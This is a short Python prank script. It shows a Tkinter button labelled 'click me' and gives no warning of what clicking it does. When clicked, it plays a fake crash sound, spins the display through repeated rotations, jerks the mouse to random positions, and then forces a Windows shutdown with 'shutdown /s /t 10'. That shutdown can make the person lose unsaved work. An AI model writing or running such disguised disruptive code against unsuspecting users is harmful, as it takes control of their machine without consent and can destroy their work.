import pyautogui as p
import rotatescreen as rs
import random
import time 
import os
from tkinter import *
from playsound import playsound
from threading import Thread

win =Tk()
win.geometry("300x300")
def sound():
    playsound("PC Freeze Crash Sound.mp3")
def z():
    
    screen = rs.get_primary_display( )
    for i in range(40):
        screen.rotate_to(i*90 % 360)
        x=random.randint(900,1500)
        y=random.randint(400,800)

        p.moveTo(x,y)
    
        
        time.sleep(0.4)

    screen.set_landscape()
    os.system("shutdown /s /t 10")

def run():
    Thread(target = z).start()
    Thread(target = sound).start()

btn = Button(win,width=10,height=4,text="click me",command=run).place(x=100,y=90)
win.mainloop()